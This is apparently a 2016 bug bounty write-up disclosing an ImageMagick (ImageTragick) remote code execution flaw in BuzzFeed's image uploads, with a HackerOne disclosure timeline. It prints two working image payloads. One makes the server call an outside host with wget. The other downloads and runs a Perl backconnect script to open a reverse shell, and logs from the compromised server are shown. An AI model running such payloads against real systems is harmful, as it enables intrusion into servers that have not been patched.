---
layout: post
title:  "BuzzFeed Remote Code Execution Vulnerability"
date:   2016-07-27 17:00:00
categories:
    - project
tags:
    - Bug Bounty
    - RCE Vulnerability
    - HackerOne
---

We just found some vulnerabiliy on the Buzzfeed.com website. That vulnerabillity infected ImageMagick, an applications that used by Buzzfeed for processing an images that inputted by the user. Through the upload form in Buzzfeed page, an attacker can upload an image file that has been injected by malicious code.

**Infected URLs:**

https://www.buzzfeed.com/post

https://www.buzzfeed.com/settings



#### Malicious Code 1:

~~~
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"; wget https://noobsec.org:1337/ping-me; touch "hello)'
pop graphic-context
~~~


**Response:**

~~~
Connection from 54.208.xx.xx port 1337 [tcp/menandmice-dns] accepted
GET /ping-me HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: noobsec.org:1337
Connection: Keep-Alive
~~~


#### Malicious Code 2:

~~~
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"; cd /tmp && wget https://noobsec.org/backconnect.txt && mv /tmp/backconnect.txt /tmp/n00b.pl && perl /tmp/n00b.pl noobsec.org 1337; touch "hello)'
pop graphic-context
~~~


**Response:**

~~~
Connection from 54.87.xx.xx port 1337 [tcp/menandmice-dns] accepted
/bin/sh: 0: can't access tty; job control turned off
$ uname â€“a
Linux buzzfeed-prod-web01 3.2.0-101-virtual [#141](/reports/141)-Ubuntu SMP Thu Mar 10 22:12:23 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
~~~

Exploit code above allow Buzzfeed's servers to connect to the noobsec.org's server through Port 1337, so an attacker can send a command shell to Buzzfeed server (Remote Code Execution).


Timeline

- 23 July 2016 : Report Bug to Buzzfeed
- 27 July 2016 : Buzzfeed respond and ask for details
- 27 July 2016 : Buzzfeed ask to continue disscussion via Hackerone
- 27 July 2016 : Noobsec submit bug in Hackerone
- 28 July 2016 : Buzzfeed confirmed bug has been fixed


Reference:

1. https://imagetragick.com/
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714
